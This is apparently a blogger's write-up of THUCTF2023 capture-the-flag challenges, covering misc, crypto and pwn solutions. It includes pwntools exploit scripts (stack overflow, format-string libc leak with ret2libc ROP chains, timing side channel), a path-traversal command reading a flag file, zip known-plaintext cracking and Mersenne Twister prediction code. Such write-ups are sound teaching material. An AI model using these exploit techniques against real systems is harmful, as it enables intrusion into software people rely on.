---
title: THUCTF2023 WriteUp
date: 2023-10-13T17:04:54+08:00
description: æˆ‘çš„ THUCTF2023ï¼ˆéƒ¨åˆ†é¢˜ç›®å’Œ PKU GeekGame 3rd ç›¸åŒï¼‰çš„ WriteUpã€‚
image: thuctf2023/poster.webp
tags:
-   writeup
-   ctf
---

>   æ‰“ [THUCTF](https://thuctf.redbud.info/games/6/) æ‰“çš„

~~ä»€ä¹ˆæ¯”è° ddl çˆ†å¾—å¤šæŒ‘æˆ˜èµ›ï¼ˆ~~

<Excerpt />

## Misc

### ä¸€é“éš¾é¢˜

base64 decode `aHR0cHM6Ly9kaXNjb3JkLmdnL1RZa1RNWkZnYiBvciBRUUdyb3VwOjUzNDg0MDcxOQ==` å¾—åˆ° `https://discord.gg/TYkTMZFgb or QQGroup:534840719`ã€‚

åŠ å…¥ Discord å¾—åˆ° flagï¼š

![flag](thuctf2023/checkin-flag.png)

### çŒ«å’ªçŠ¶æ€ç›‘è§†å™¨

`/usr/sbin/service` å®é™…ä¸Šæ˜¯ä¸€ä¸ª shell è„šæœ¬ï¼Œæ‰§è¡Œ `/etc/init.d` é‡Œçš„æœåŠ¡ï¼Œä½†å¯ä»¥ path traversalï¼Œä½¿ç”¨ `service ../../bin/cat /flag.txt` å³å¯å¾—åˆ° flagã€‚

![flag](thuctf2023/sc-flag.png)

### éº¦æ©Â·åº“æ‹‰å¤«ç‰¹

æ ¹æ®æç¤ºï¼Œflag é™„è¿‘ä¼šæœ‰é’»çŸ³å—ã€‚ä½¿ç”¨ [uNmINeD](https://unmined.net/) å¯ä»¥ç›´æ¥æœç´¢åˆ°é’»çŸ³å—çš„ä½ç½®ï¼š

![æœç´¢é’»çŸ³å—ä½ç½®](thuctf2023/mc-unmined.png)

#### Level 1

tp åˆ°é’»çŸ³å—ä½ç½®å³å¯çœ‹åˆ°ï¼šï¼ˆæˆ–è€…ä¹Ÿå¯ä»¥è¿›å…¥æ—è§‚æ¨¡å¼ç„¶åé€šè¿‡é€è§†æ¥æ‰¾ç«æŠŠï¼‰

![flag1](thuctf2023/mc-flag1.png)

#### Level 2

tp åˆ°é’»çŸ³å—ä½ç½®å³å¯çœ‹åˆ°ï¼š

![flag2](thuctf2023/mc-flag2.png)

#### Level 3

tp åˆ°é’»çŸ³å—ä½ç½®å¯ä»¥çœ‹åˆ°ç£å¸¦æœºå’Œæ˜¾ç¤ºå±ã€‚æ˜¾ç¤ºå±çš„è¾“å…¥ / ç£å¸¦æœºçš„è¾“å‡ºæ˜¯æ¯ 4 bits ç¼–ç ä¸ºçº¢çŸ³ä¿¡å·çš„å¼ºåº¦ï¼Œå¯ä»¥åœ¨ä¸‹å›¾æ‰€ç¤ºä½ç½®è¯»å–åˆ°ï¼š

![è¯»å–çº¢çŸ³ä¿¡å·å¼ºåº¦](thuctf2023/mc-redstone.png)

ä½¿ç”¨ <kbd>F3+I</kbd> å¯ä»¥å°†å½“å‰æŒ‡å‘æ–¹å—çš„æ•°æ®å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œåˆ©ç”¨è¿™ä¸ª feature å¯ä»¥è‡ªåŠ¨è¯»å–æ•°æ®ã€‚ï¼ˆæ„Ÿè§‰åº”è¯¥æœ‰æ›´å¥½çš„æ–¹æ³•è¯»å–æ•°æ®ä½†æˆ‘ä¸ä¼šï¼›å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æ ¹æ®ç£å¸¦æœºçš„ç»“æ„è¯»å­˜æ¡£å°±ä¸ç”¨æ‰§è¡Œäº†ï¼Œä½†æ„Ÿè§‰åˆ†æç£å¸¦æœºç»“æ„ä¹Ÿæœ‰ç‚¹éº»çƒ¦ï¼ˆ

```bash
#!/bin/bash

sleep 5

echo > flag3.log

while true; do
    xdotool key F3+i
    printf '%s %x\n' "$(date +%N)" "$(xsel -b -o | sed -E 's/.*power=([0-9]+).*/\1/g')" >> flag3.log
done
```

ä½†æ˜¯è¿™æ ·è¯»å–ä¼šæœ‰ä¸€å®šçš„è¯¯å·®ï¼Œé€šè¿‡è®°å½•æ—¶é—´æˆ³å¹¶è¿‡é‡‡æ ·å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šå‡å°è¯¯å·®ï¼Œä½†å…‰æ˜¯è¿™æ ·éš¾ä»¥æ¶ˆé™¤åˆ°åˆç†çš„æ°´å¹³ã€‚å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šå¤šé‡‡æ ·å‡ è½®ï¼Œç›¸å½“äºè¿›è¡Œæ›´å¤šæ¬¡çš„è¿‡é‡‡æ ·ï¼Œéšåå¯ä»¥å¯¹æ¯è½®çš„ç»“æœå–ä¼—æ•°ã€‚æˆ‘æœ€åæ˜¯è¯»äº† 12 è½®ï¼Œå¤§æ¦‚ 11 è½®å¯ä»¥å¾—åˆ°å®Œå…¨æ­£ç¡®çš„æ–‡ä»¶ï¼Œç¨å°‘å‡ è½®å¯ä»¥å¾—åˆ°ç ´æŸä½†èƒ½å¤Ÿè¯†åˆ«å‡º flag çš„å›¾ç‰‡ã€‚

æ ¹æ®è¯»å–å‡ºçš„ç»“æœå®¹æ˜“çœ‹å‡ºæ˜¯ä¸€å¼  PNGï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®å…¶ signature æ¥åˆ¤æ–­å¼€å¤´ç»“å°¾è¿›è¡Œåˆ†å‰²ã€‚

```python
import codecs
from rapidfuzz import fuzz

result = []

with open('flag3.log') as log:
    lasttime = -1
    last = ''
    total_delta = 0
    for line in log:
        time, x = line.split()
        time = int(time)
        delta = 0 if lasttime == -1 else time - lasttime
        if delta < 0:
            delta += 1000000000
        lasttime = time
        total_delta += delta
        if x != last:
            result.append(x)
            last = x
        elif len(result) + 0.5 < total_delta / 200000000:
            result.append(x)

hex = ''.join(result)

png_header_pos = []
i = 0
while True:
    if fuzz.ratio(hex[i:i+8], '89504e47') > 80 and fuzz.ratio(hex[i:i+8], '89504e47') >= fuzz.ratio(hex[i+1:i+9], '89504e47'):
        print(str(i).rjust(5), hex[i:i+160])
        png_header_pos.append(i)
        i += 100
    i += 1
    if i > len(hex) - 10:
        break

png_header_pos = png_header_pos[0:-1]

fixed_hex = []

for i in range(0, 4200):
    options = []
    for pos in png_header_pos:
        options.append(hex[pos + i])
    fixed_hex.append(max(set(options), key=options.count))

fixed_hex = ''.join(fixed_hex).split('ae426082')[0] + 'ae426082'
png = codecs.decode(fixed_hex, 'hex')
open('flag3.png', 'wb').write(png)
```

å¾—åˆ°çš„ PNG å¦‚ä¸‹ï¼š

![flag3](thuctf2023/mc-flag3.png)

### KFC

ä½¿ç”¨ Google æœç´¢é™„ä»¶å›¾ç‰‡å³å¯å¾—åˆ°åº—åã€‚

![å›¾ç‰‡æœç´¢](thuctf2023/kfc-search.png)

![flag](thuctf2023/kfc-flag.png)

### æœªæ¥ç£ç›˜

#### Level 1

gzip ä½¿ç”¨ Deflateï¼Œè€Œ Deflate stream ç”±å¤šä¸ª block æ„æˆï¼Œå¯ä»¥æ‰¾åˆ°ä½äºä¸­å¤®ã€å’Œå…¶ä»– block é•¿å¾—ä¸ä¸€æ ·çš„ blockï¼Œå®ƒå°±æ˜¯åŒ…å«äº† flag çš„ blockï¼Œå¯ä»¥å°†å…¶è§£å‹è€Œä¸¢å¼ƒå…¶ä»– blockï¼Œå¾ªç¯è¿›è¡Œè¿™ä¸ªè¿‡ç¨‹ç›´åˆ°å¾—åˆ° flagã€‚

è§£å‹å‡ºçš„ä¸œè¥¿éœ€è¦è¿›ä¸€æ­¥è§£å‹ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡æšä¸¾æ‰¾åˆ°è§£å‹å‡ºçš„è¿™ä¸ªä¸œè¥¿é‡Œä¸€ä¸ª block çš„å¼€å¤´ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ Deflate stream ä»¥ bit è€Œé byte ä¸ºå•ä½ã€‚æ•°æ®ä¸­å¯èƒ½åŒ…å«å‘å‰çš„å¼•ç”¨ï¼Œæ‰€ä»¥ä»ä¸­é—´ä¸€ä¸ª block å¼€å§‹è§£å‹å¯èƒ½æŠ¥é”™ï¼Œå¯ä»¥åœ¨å·²ç»è§£å‹äº†å¼€å¤´è‹¥å¹² block çš„åŸºç¡€ä¸Šè¿›è¡Œè§£å‹ã€‚æ€»ä¹‹å®ç°èµ·æ¥å¾ˆéº»çƒ¦ï¼ˆï¼Œè€Œä¸”åº”è¯¥æœ‰å“ªä¸å®Œå–„ï¼Œä¸ç„¶ level 2 æŒ‰ç†æ¥è¯´ä¹Ÿèƒ½æå‡ºæ¥ã€‚

è¿è¡Œä¸‹é¢çš„ä»£ç å‰éœ€è¦å…ˆè§£å‹ä¸€éå¾—åˆ°å†…éƒ¨ä¸€å±‚çš„ gz æ–‡ä»¶ã€‚

```cpp
#include <zlib.h>

#include <cassert>
#include <cstdio>
#include <cstdlib>
#include <cstring>

using namespace std;

const int CHUNK = 1 << 28;

unsigned char in[CHUNK], out[CHUNK];

int main()
{
    auto *s = new z_stream;
    s->zalloc = Z_NULL;
    s->zfree = Z_NULL;
    s->opaque = Z_NULL;
    s->avail_in = 0;
    s->next_in = Z_NULL;
    inflateInit2(s, -15);

    FILE *input = fopen("gzip-flag1-2.gz", "rb");
    fseek(input, 10, SEEK_SET);
    s->avail_in = fread(in, 1, CHUNK, input);
    fclose(input);
    s->next_in = in;

    z_stream foo;
    foo.next_in = Z_NULL;

    for (int round = 0; round < 2; ++round)
    {
        unsigned int commonHead = -1;

        for (int t = 0;; ++t)
        {
            s->avail_out = CHUNK;
            s->next_out = out;
            const int ret = inflate(s, Z_BLOCK);

            if (ret == Z_STREAM_END)
                break;

            if (ret != Z_OK)
                printf("%d %d\n", t, ret);
            assert(ret == Z_OK);

            const int unused_bits = s->data_type & 7;
            unsigned int head = s->next_in[-1] >> (8 - unused_bits);
            unsigned char *nxt = s->next_in;
            for (int i = 0; i < 4; ++i)
                head |= nxt[i] << (i * 8 + unused_bits);
            if (commonHead == -1)
                commonHead = head;
            else if (head != commonHead)
            {
                s->avail_out = CHUNK;
                s->next_out = out;
                assert(inflate(s, Z_BLOCK) == Z_OK);
                printf("different head: %d %x %x\n", t, head, commonHead);
                break;
            }

            if (unused_bits == 0 && foo.next_in == Z_NULL)
                inflateCopy(&foo, s);
        }

        int len;

        len = CHUNK - s->avail_out;
        memcpy(in, out, len);

        FILE *output = fopen("output", "wb");
        fwrite(out, 1, len, output);
        fclose(output);

        int start = 0;

        for (int offset = 0; offset < 8; ++offset)
        {
            for (int j = 0; j < 8000 && j < len; ++j)
            {
                if (j % 1000 == 0)
                    printf("finding start: %d %d\n", offset, j);
                inflateEnd(s);
                delete s;
                s = new z_stream;
                inflateCopy(s, &foo);
                s->next_in = in + j;
                s->avail_in = len - j;
                s->avail_out = CHUNK;
                s->next_out = out;
                if (inflate(s, Z_BLOCK) != Z_OK)
                    continue;
                if (CHUNK - s->avail_out < 10000)
                    continue;
                s->avail_out = CHUNK;
                s->next_out = out;
                if (inflate(s, Z_BLOCK) != Z_OK)
                    continue;
                if (CHUNK - s->avail_out < 10000)
                    continue;
                printf("start: %d %d %d %llx\n", j, CHUNK - s->avail_out, offset,
                       *(unsigned long long *)out);
                start = j;
                break;
            }
            if (start)
                break;
            for (int i = 0; i < len; ++i)
                in[i] = (in[i] >> 1) | ((in[i + 1] & 1) << 7);
        }

        if (start == 0)
            exit(1);

        inflateEnd(s);
        inflateCopy(s, &foo);
        s->next_in = in + start;
        s->avail_in = len - start;
    }
}
```

![flag1](thuctf2023/gzip-flag1.png)

### Dark Room

#### Level 1

é€šè¿‡æ‰‹ç©ä»¥åŠæŸ¥çœ‹[æºç ](https://github.com/tinichu316/Dark_Room)ï¼Œé¦–å…ˆé€šå…³å¾—çŸ¥æ‹¿åˆ° flag éœ€è¦ sanity è‡³å°‘ä¸º 117%ï¼Œè¿™éœ€è¦ä½¿ç”¨æœ€ä¼˜è§£é€šå…³å¹¶ä½¿ç”¨ help å‘½ä»¤è¿›è¡Œä¸€å®šçš„å›å¤ã€‚å¯ä»¥å°†æœ€ä¼˜è§£è®°å½•ä¸‹æ¥ç„¶åè‡ªåŠ¨å°è¯• helpï¼Œåœ¨ sanity è¶³å¤Ÿé«˜æ—¶è‡ªåŠ¨é€šå…³è·å¾— flagã€‚

```python
from pwn import *
import re

count = 0
max_sanity = 0

while True:
    sh = remote('chal.thuctf.redbud.info', 50630)
    sh.sendlineafter(b'[...]:', b'newgame')
    sh.sendlineafter(b'[...]:', b'ouuan')
    sh.sendlineafter(b'(y/n)', b'y')
    sh.sendlineafter(b'[ouuan]:', b'h')
    sh.sendlineafter(b'[ouuan]:', b'h')
    sh.sendlineafter(b'[ouuan]:', b'h')
    sh.recvuntil(b'Sanity:')
    sanity_line = sh.recvline().decode()
    sanity = int(re.findall(r'\d+', sanity_line)[0])
    count += 1
    max_sanity = max(max_sanity, sanity)
    print(sanity, max_sanity, count)
    if sanity < 120:
        sh.close()
        continue
    commands = '''n
n
e
pickup key
w
s
s
e
e
e
pickup trinket
use trinket
w
s
usewith key door
s
s
n
w
w
w
n
pickup key
s
e
e
e
n
n
w
w
n
n
w
w
usewith key door
n'''.split('\n')
    for c in commands:
        print(sh.recvuntil(b'[ouuan]:').decode())
        print(c)
        sh.sendline(c.encode())
    sh.interactive()
    break
```

![flag1](thuctf2023/darkroom-flag1.png)

#### Level 2

é¦–å…ˆèµ°åˆ° FlagRoomï¼Œ`getflag` åè¾“å…¥éæ•°å­—å¯ä»¥çœ‹åˆ°æŠ¥é”™ï¼š

```python
    248:   while flag_number:
    249:      choice = int(self.recv(b"Guess my public key (give me a number): ").decode())
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    250:      if flag_number & 1:
    251:          p = getStrongPrime(2048)
    252:          q = getStrongPrime(2048)
    253:      flag_number >> 1
```

å…¶ä¸­ `getStrongPrime` æ˜¯ä¸€ä¸ªè€—æ—¶å¾ˆé•¿çš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ—¶é—´ä¾§ä¿¡é“è·å–åˆ° `flag_number`ã€‚

```python
from pwn import *
import time

sh = remote('chal.thuctf.redbud.info', 52124)
sh.sendlineafter(b'[...]:', b'newgame')
sh.sendlineafter(b'[...]:', b'ouuan')
sh.sendlineafter(b'(y/n)', b'y')

commands = '''n
n
w
w
s
getflag'''.split('\n')

for c in commands:
    print(sh.recvuntil(b'[ouuan]:').decode())
    print(c)
    sh.sendline(c.encode())

result = ""
current = 0
bit = 0

while True:
    sh.sendlineafter(b"number): ", b"1")
    start = time.time()
    sh.recvline()
    end = time.time()
    if end - start > 0.5:
        current = current + (1 << bit)
    if bit == 7:
        result = chr(current) + result
        print(result)
        if result.startswith("HUCTF{"):
            break
        current = 0
        bit = 0
    else:
        bit += 1

sh.interactive()
```

![flag2](thuctf2023/darkroom-flag2.png)

### Huavvei Mate

#### Level 1

é¦–å…ˆå°†æ¯å—çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œè¿›è¡Œæ‹¼å›¾è€Œä¸æ˜¯çœŸçš„åå®¹é“ã€‚æˆ‘æ˜¯æ‰‹åŠ¨åœ¨ GIMP é‡Œæ‹¼çš„ã€‚å¯ä»¥å‚è€ƒ [QR Code Tutorial - Thonky.com](https://www.thonky.com/qr-code-tutorial/) å’Œ [QR code - Wikipedia](https://en.wikipedia.org/wiki/QR_code)ï¼Œå¹¶ä½¿ç”¨ [QRazyBox](https://merri.cx/qrazybox/) è¾…åŠ©ã€‚

1.  æŠŠ finder pattern æ‹¼å‡ºæ¥ã€‚
2.  æŠŠ timing pattern æ‹¼å‡ºæ¥ã€‚
3.  æŠŠ alignment pattern çš„ä¸»ä½“éƒ¨åˆ†æ‹¼ä¸Šã€‚
4.  æŸ¥è¡¨å¾—çŸ¥ ECC level ä¸º Lï¼Œmask pattern ä¸º 3ã€‚æ ¹æ® flag æ ¼å¼å¯ä»¥å¾—çŸ¥ input mode æ˜¯ byteï¼Œå¼€å¤´å‡ ä¸ªå­—ç¬¦æ˜¯ `THUCTF{`ï¼Œæ®æ­¤å¯ä»¥æŠŠæœ€å³è¾¹æ‹¼å‡ºæ¥ã€‚
5.  å‰©ä¸‹çš„å¯ä»¥é€å—è¿›è¡Œå°è¯•ï¼Œä¿è¯å¾—åˆ°çš„æ˜¯å¯è§å­—ç¬¦ï¼ˆè€Œä¸”æœ€å¥½æœ‰ä¸€å®šè¯­ä¹‰ï¼‰ã€‚

æœ€åå¾—åˆ°äºŒç»´ç å¦‚ä¸‹ï¼Œæ‰«ç å¾—åˆ° flagã€‚

![qrcode](thuctf2023/huavvei-hard-qrcode.png)

### åŸºæœ¬åŠŸ

#### Level 1

é™„ä»¶çš„æ–‡ä»¶åæç¤ºäº†éœ€è¦ä½¿ç”¨ [bkcrack](https://github.com/kimci86/bkcrack)ï¼Œå³ä½¿ç”¨å·²çŸ¥çš„éƒ¨åˆ†æ˜æ–‡æ¥æ”»å‡»ä¸å®‰å…¨çš„ Zip åŠ å¯†æ–¹å¼ã€‚

æ ¹æ®å‹ç¼©åŒ…å†…å·²çŸ¥çš„æ–‡ä»¶å `chromedriver_linux64.zip` å’Œæ–‡ä»¶å¤§å°ï¼Œåœ¨ https://chromedriver.storage.googleapis.com/index.html è¿›è¡Œæœç´¢ï¼Œå‘ç°æ˜¯ 89.0.4389.23ã€‚

ä¸‹è½½åæŒ‰ç…§ bkcrack çš„è¯´æ˜å³å¯ç ´è§£å¯†ç å¾—åˆ° flagã€‚

![flag1](thuctf2023/bkcrack-flag1.png)

#### Level 2

æ ¹æ® pcapng çš„å›ºå®šä¸å˜çš„æ–‡ä»¶å¤´ï¼ˆå‚è€ƒ [PCAP Next Generation Dump File Format](https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html#sectionshb)ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å­˜ä¸€ä¸ªå’Œ forensics çš„é™„ä»¶è¿›è¡Œå¯¹æ¯”ï¼‰å³å¯å¾—åˆ°å·²çŸ¥æ˜æ–‡ã€‚å› ä¸ºä¸­é—´æœ‰ä¸€ä¸ªå¯å˜çš„ block lengthï¼Œéœ€è¦ä½¿ç”¨ `bkcrack` çš„ `-x` é€‰é¡¹æä¾›åˆ†æ®µçš„æ˜æ–‡ã€‚

`signature.pcapng`: `0a 0d 0d 0a`

```bash
bkcrack -C bkcrack_level2.zip -c flag.pcapng -P level2-known-plain.zip -p signature.pcapng -x 6 00004d3c2b1a01000000ffffffffffffffff
```

![flag2](thuctf2023/bkcrack-flag2.png)

## Crypto

### easycrypto

#### Level 1

å°† `cipher.txt` è¾“å…¥åˆ° https://quipqiup.com/ å³å¯å¾—åˆ° flagã€‚

![flag1](thuctf2023/easycrypto-flag1.png)

#### Level 2

é€šè¿‡åç¼–è¯‘ä»¥åŠè¿è¡Œå¯ä»¥çœ‹å‡ºï¼Œ`main` æ˜¯æŠŠ flag æŒ‰ `table.txt` ä½œä¸ºå­—æ¯è¡¨è¿›è¡Œ base64 ç¼–ç ï¼Œå¹¶åœ¨æœ€åè¾“å‡ºå­—æ¯è¡¨çš„ç¬¬ä¸€ä½ï¼ˆå³ `A` çš„å¯†æ–‡ï¼‰ã€‚

æ ¹æ® level 1 å¯ä»¥å¾—åˆ°ä¸€éƒ¨åˆ†çš„å¯†æ–‡å¯¹åº”å…³ç³»ï¼Œå†æ ¹æ® flag çš„å¼€å¤´æ˜¯ `THUCTF{` å¯ä»¥å†å¾—åˆ°ä¸€äº›ã€‚å‰©ä¸‹çš„å¯ä»¥éšæœºå°è¯•ç›´åˆ°è¯•å‡ºç¬¦åˆæ ¼å¼æ¡ä»¶çš„ flagã€‚

```python
import re
import string
import random
from base64 import b64decode

plaintext  = "You are right, but The Legend of Zelda is an action-adventure game franchise created by the Japanese game designers Shigeru Miyamoto and Takashi Tezuka. It is primarily developed and published by Nintendo, although some portable installments and re-releases have been outsourced to Flagship, Vanpool, and Grezzo. The gameplay incorporates action-adventure and elements of action RPG games. THUCTF{cryptography_is_interesting} VEhVQ1RGe A"
ciphertext = "Xzi rmc mbdga, nia Agc Qcdcjy zl Ocqyr bw rj rpabzj-rytcjaimc drsc lmrjpgbwc pmcracy nx agc Erurjcwc drsc ycwbdjcmw Wgbdcmi Sbxrszaz rjy Arkrwgb Acoikr. Ba bw umbsrmbqx yctcqzucy rjy uinqbwgcy nx Jbjacjyz, rqagzidg wzsc uzmarnqc bjwarqqscjaw rjy mc-mcqcrwcw grtc nccj ziawzimpcy az Lqrdwgbu, Trjuzzq, rjy Dmcooz. Agc drscuqrx bjpzmuzmracw rpabzj-rytcjaimc rjy cqcscjaw zl rpabzj MUD drscw. AGIPAL{pmxuazdmrugx_bw_bjacmcwabjd} TCgTV1MDc R"
encoded = "TCgTV1MDc0qlSAN1S182XHSoXeM9"
table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

while True:
    d = {}
    revd = {}
    unused = set(table[:52])

    for i in range(len(ciphertext)):
        if plaintext[i] in string.ascii_letters:
            d[plaintext[i]] = ciphertext[i]
            revd[ciphertext[i]] = plaintext[i]
            if ciphertext[i] in unused:
                unused.remove(ciphertext[i])

    new_table = {}
    r = [i for i in range(52)]
    random.shuffle(r)
    for i in r:
        if table[i] in d:
            new_table[i] = d[table[i]]
        else:
            new_table[i] = unused.pop()
            revd[new_table[i]] = table[i]

    new_table = [new_table[i] for i in range(52)]
    new_table = "".join(new_table) + table[52:]

    encoded_decrypted = "".join([revd[x] if x in revd else x for x in encoded])
    try:
        flag = b64decode(encoded_decrypted).decode()
    except:
        continue
    if re.match('THUCTF\\{[a-zA-Z0-9_]*\\}', flag):
        print(flag, new_table)
```

![flag2](thuctf2023/easycrypto-flag2.png)

### å°ç« é±¼çš„ Cookie

#### Level 1

ä»£ç ä¸­ä½¿ç”¨äº† Python çš„ `random` åº“ï¼Œè€Œå…¶ä½¿ç”¨çš„ Mersenne Twister ç®—æ³•æ˜¯ä¸å®‰å…¨çš„ï¼ŒåŸºäºè¿ç»­ 624 ä¸ª 32-bit è¾“å‡ºå°±å¯ä»¥æ¨æµ‹å‡ºæ¥ä¸‹æ¥çš„è¾“å‡ºï¼Œé¢˜ç›®ä¸­æ­£å¥½æä¾›äº†å…¶ç”Ÿæˆçš„ 2500 bytesï¼Œè¶³ä»¥æ¨æµ‹å‡ºåé¢çš„è¾“å‡ºï¼Œå†å¼‚æˆ–å³å¯ã€‚

```python
from pwn import *
from randcrack import RandCrack

# sh = process(['python', 'cookie.py'])
sh = remote('chal.thuctf.redbud.info', 50294)
sh.sendline(b'1')

sh.recvuntil(b'void*\n')
b = bytes.fromhex(sh.recvline().strip().decode())

rc = RandCrack()

for i in range(0, 624 * 4, 4):
    rc.submit(int.from_bytes(b[i:i+4], 'little'))

for i in range(624 * 4, len(b), 4):
    x = rc.predict_getrandbits(32)
    print(bytes([p ^ q for p, q in zip(b[i:i+4], x.to_bytes(4, 'little'))]).decode(), end='')
```

![flag1](thuctf2023/cookie-flag1.png)

#### Level 2

é˜…è¯» Python çš„ `random` åº“[æºç ](https://github.com/python/cpython/blob/84b7e9e3fa67fb9b92088d17839d8235f1cec62e/Modules/_randommodule.c#L226-L232)ï¼Œå¯ä»¥å‘ç° seed ä¼šè¢«å¾ªç¯ä½¿ç”¨ä»¥è¡¥è¶³åˆ° 624 ä¸ª 32-bitï¼Œæ‰€ä»¥å°†æ‹¿åˆ°çš„ seed é‡å¤ä¸¤éå‘å›å°±å¯ä»¥ seed ä¸åŒä½†ç”Ÿæˆçš„åºåˆ—ç›¸åŒï¼Œç„¶åå°±å’Œ level 1 ä¸€æ ·äº†ã€‚

```python
from pwn import *
from randcrack import RandCrack

# sh = process(['python', 'cookie.py'])
sh = remote('chal.thuctf.redbud.info', 50842)
sh.sendline(b'2')

sh.recvuntil(b'<')
seed = sh.recvuntil(b'>')[:-1]
sh.sendlineafter(b'>', seed * 2)

sh.recvuntil(b'void*\n')
b = bytes.fromhex(sh.recvline().strip().decode())

rc = RandCrack()

for i in range(0, 624 * 4, 4):
    rc.submit(int.from_bytes(b[i:i+4], 'little'))

for i in range(624 * 4, len(b), 4):
    x = rc.predict_getrandbits(32)
    print(bytes([p ^ q for p, q in zip(b[i:i+4], x.to_bytes(4, 'little'))]).decode(), end='')
```

![flag2](thuctf2023/cookie-flag2.png)

#### Level 3

è¿™é¢˜æœ‰ç‚¹..æ„Ÿè§‰åº”è¯¥ä¸æ˜¯ intended solutionï¼ˆä¸ç„¶æ— è®ºæ˜¯éš¾åº¦è¿˜æ˜¯åˆ†ç±»éƒ½ä¸å¯¹ï¼ˆ

ç›´æ¥æŠŠæ‰€æœ‰ curse å‘å›ä¼šè¢« `input` åœ¨ä¸€å®šé•¿åº¦å¤„æˆªæ–­å¯¼è‡´ä¸ç¬¦ã€‚ä½† `zip` è¿”å›çš„é•¿åº¦æ˜¯è¾ƒçŸ­ä¸€æ–¹çš„é•¿åº¦ï¼Œæ‰€ä»¥åªå‘ä¸€ä¸ª seed å³å¯ã€‚

```python
from pwn import *

# sh = process(['python', 'cookie.py'])
sh = remote('chal.thuctf.redbud.info', 50846)
sh.sendline(b'3')
sh.recvuntil(b'<')
curse = sh.recvuntil(b'>').split(b',')[0]
sh.sendlineafter(b'>', curse)
print(sh.recvall())
```

![flag3](thuctf2023/cookie-flag3.png)

### Another V ME 50

è¿è¡Œ & é˜…è¯»ä»£ç å¯çŸ¥ï¼Œpassword æ˜¯ username åŠ ç›çš„ sha256 çš„æœ«å°¾ï¼Œè·å¾— flag å°±æ˜¯è¦æ‰¾åˆ° hash collisionï¼Œç„¶åæŒ‰æç¤ºæ³¨å†Œç™»å½• buy flag å³å¯ã€‚

```python
from hashlib import sha256

PREFIX = b"CryptoUserInfo"
def get_token(byte: bytes):
    return sha256(PREFIX + byte).digest()[-7:]

tokens = {}

for i in range(1000000000):
    token = get_token(str(i).encode())
    if token in tokens:
        print(i, tokens[token], token.hex())
        break
    tokens[token] = i
```

è¿è¡Œå¾—åˆ° collision `117361489 8567312 7797a591e9c707`ã€‚

![flag](thuctf2023/anothervme50-flag.png)

## Pwn

### æµ‹æµ‹ä½ çš„ç½‘çŒ«

![flag](thuctf2023/nc-flag.png)

### babystack

#### Level 1

åç¼–è¯‘å‘ç°å®ƒçœ‹ä¼¼é™åˆ¶äº†è¾“å…¥é•¿åº¦ï¼Œä½† `get_line` å‡½æ•°çš„å®ç°æœ‰é—®é¢˜ï¼Œé•¿åº¦è¾“å…¥ 0 å³å¯å‡æ³•æº¢å‡ºè€Œæ²¡æœ‰é•¿åº¦é™åˆ¶ã€‚

```c
void get_line(long param_1, int param_2)
{
    char *__buf;
    uint uVar1;

    uVar1 = 0;
    while (true)
    {
        if (param_2 - 1U <= uVar1)
        {
            return;
        }
        __buf = (char *)((ulong)uVar1 + param_1);
        read(0, __buf, 1);
        if (*__buf == '\n')
            break;
        uVar1 = uVar1 + 1;
    }
    *__buf = '\0';
    return;
}
```

æ ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œè¿”å›åˆ° `backdoor` å³å¯ get shellï¼Œç„¶å `cat /flag` è·å¾— flagã€‚

```python
from pwn import *

# sh = process('./babystack')
sh = remote('chal.thuctf.redbud.info', 50395)
sh.sendlineafter(b'included!)', b'0')
payload = p64(0x4011be) * 0x10
sh.sendlineafter(b'string:', payload)
sh.interactive()
```

![flag1](thuctf2023/babystack-flag1.png)

#### Level 2

ä»£ç ä¸­ `printf` çš„ format string å¯æ§åˆ¶ï¼Œä»è€Œå¯ä»¥æ³„éœ²å‡º libc çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥ ret2libcã€‚

`/bin/sh`ã€`system`ã€`pop %rdi` çš„åœ°å€æ˜¯ç”¨ `objdump` åœ¨ `libc.so.6` é‡Œæ‰¾åˆ°çš„ï¼Œ`offset` ä»¥åŠ `%25$p` å¯ä»¥è¿è¡Œä¸€ä¸‹è¯•å‡ºæ¥ã€‚

```python
from pwn import *

binsh = 0x1d8698
system = 0x508f2
poprdi = 0x2a3e5
offset = -0x29d90

# sh = process(['./ld-linux-x86-64.so.2', './childrenstack'], env={"LD_PRELOAD": "./libc.so.6"})
sh = remote('chal.thuctf.redbud.info', 52087)
sh.sendlineafter(b"(less than 0x20 characters)", b"%25$p")
sh.recvuntil(b"flag:")
libc = int(sh.recvuntil(b"What will you do").decode().split("What will you do")[0].strip(), 16) + offset
sh.sendlineafter(b"capture it?:", b'a' * 0x78 + p64(libc + poprdi) + p64(libc + binsh) + p64(libc + system))
sh.interactive()
```

![flag2](thuctf2023/babystack-flag2.png)

#### Level 3

è¢« hint æ‹å»å­¦äº†ä¸€ä¸‹ format string å†™ï¼Œç»“æœè¯•äº†ä¸‹ç”¨å’Œ level 2 ä¸€æ ·çš„åšæ³•å°±èƒ½è¿‡ï¼Œæ„Ÿè§‰ unintended äº†ï¼ˆ

```python
from pwn import *

binsh = 0x1d8698
system = 0x508f2
poprdi = 0x2a3e5
offset = -0x29d90

# sh = process(['./ld-linux-x86-64.so.2', './teenagerstack'], env={"LD_PRELOAD": "./libc.so.6"})
sh = remote('chal.thuctf.redbud.info', 52251)
sh.sendlineafter(b"(less than 0x20 characters)", b"%21$p")
sh.recvuntil(b"flag:")
start = int(sh.recvline().decode().strip(), 16) + offset
sh.sendlineafter(b"capture it?:", b'a' * 0x78 + p64(start + poprdi) + p64(start + binsh) + p64(start + system))
sh.sendlineafter(b"again? :", b"a")
sh.interactive()
```

![flag3](thuctf2023/babystack-flag3.png)

